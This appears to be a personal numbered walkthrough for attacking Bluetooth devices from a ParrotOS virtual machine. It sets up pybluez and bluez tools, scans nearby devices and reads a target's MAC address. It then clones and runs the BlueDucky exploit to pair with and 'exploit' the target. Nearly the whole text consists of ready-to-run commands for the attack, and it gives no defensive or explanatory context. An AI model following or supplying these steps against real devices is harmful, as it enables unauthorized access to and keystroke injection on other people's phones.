1. Plug Bluetooth adapter into USB port
2. Disable Bluetooth adapters on Windows Device Manager
3. Open your Linux VM, I'm using ParrotOS
4. At the top of the VM window, select Devices > USB
5. Select your Bluetooth adapter, mine is Cambridge Silicon Radio
6. Create a "Bluetooth hacking directory"
7. Open "bluetooth hacking" in terminal
8. Run ```git clone https://github.com/pybluez/pybluez.git```
9. Run ```cd pybluez```
10. Run ```sudo python setup.py install```
11. Run ```sudo hciconfig -a``` to see your Bluetooth adapters and their status
12. Run ```sudo hciconfig hci0 up``` as needed. ```hci0``` may be different depending on your number of Bluetooth adapters
13. Run ```sudo hcitool scan``` to scan for Bluetooth devices
14. Once you find your target device, copy its MAC address
15. Run ```sudo sdptool browse {MAC address}``` without curly brackets
	1. My S10's MAC address is CC:21:19:B8:E1:6E
16. Install dependencies by running ```sudo apt install -y bluez-tools bluez-hcidump libbluetooth-dev git gcc python3-pip python3-setuptools python3-pydbus```
17. Run ```cd ..``` to go to "bluetooth hacking" directory
18. Run ```git clone --depth=1 https://github.com/bluez/bluez.git```
19. Run ```cd bluez```
20. Compile bdaddr.c by running ```sudo gcc -o bdaddr ./tools/bdaddr.c ./src/oui.c -I ./ -lbluetooth```
21. Make bdaddr runnable from anywhere by running ```sudo cp bdaddr /usr/local/bin```
22. Run ```cd ..``` to return to "Bluetooth hacking"
23. Run ```git clone https://github.com/pentestfunctions/BlueDucky.git```
24. Run ```cd BlueDucky```
25. If your Bluetooth adapter is anything other than hci0:
	1. open BlueDucky.py in a text editor
	2. Under main(), on line 674 that starts with ```parser.addargument``` change ```default='hci0'```
26. Run ```chmod 755 BlueDucky.py``` to change execution permissions to ```-rwxr-xr-x```
27. Run ```sudo python BlueDucky.py``` to pair to the target's device using its MAC address and exploit it
